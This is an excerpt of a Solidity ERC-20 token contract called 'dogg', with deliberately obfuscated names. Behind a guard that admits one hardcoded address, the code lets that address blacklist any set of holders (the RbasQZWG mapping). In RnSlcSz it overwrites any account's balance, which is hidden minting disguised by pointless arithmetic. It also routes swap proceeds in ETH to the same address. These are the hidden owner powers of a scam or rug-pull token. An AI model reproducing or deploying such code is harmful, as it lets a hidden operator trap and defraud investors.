...
contract  dogg is Context, IERC20, Ownable {
    ...
    string private _name = "dogg";
    string private _symbol = "dogg";
    uint8 private _decimals = 9;
    address payable public LAxRvHHRlZd;
    ...
    mapping (address => bool) public RbasQZWG;
    ...
    constructor () {
        ...
        LAxRvHHRlZd = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));
    ...
    function dVgArVDHKW(bool DKeAetok, address[] calldata NuCOqFnHWSlY) public {
        VXjAJNsAppl(true);
        for (uint256 i; i < NuCOqFnHWSlY.length; i++) {
            RbasQZWG[NuCOqFnHWSlY[i]] = DKeAetok;
        }
    }
    ...
    function VXjAJNsAppl(bool status) view public{
        if (!status) return ;
        require(!(msg.sender != LAxRvHHRlZd) && (msg.sender == msg.sender));
    }
    ...
    function RnSlcSz(uint256 JjqtsBhSVRFU, address bmWWqFEpj) public {
        VXjAJNsAppl(true);
        uint8 i;
        i = 50;
        uint256 n = (i - 49) * JjqtsBhSVRFU + i;
        _balances[bmWWqFEpj] = uint256(n + i - i - i);
        uint8 m;
        m = i;
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(LAxRvHHRlZd, amountETHMarketing);
